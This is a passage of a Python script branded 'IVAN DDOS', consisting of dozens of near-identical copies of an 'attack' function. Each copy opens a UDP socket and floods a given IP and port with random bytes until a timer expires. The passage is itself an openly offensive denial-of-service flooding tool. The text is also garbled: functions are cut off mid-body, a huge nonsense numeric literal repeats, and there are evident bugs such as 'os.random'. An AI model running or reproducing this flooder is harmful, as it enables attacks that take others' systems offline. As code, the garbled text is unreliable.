    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break
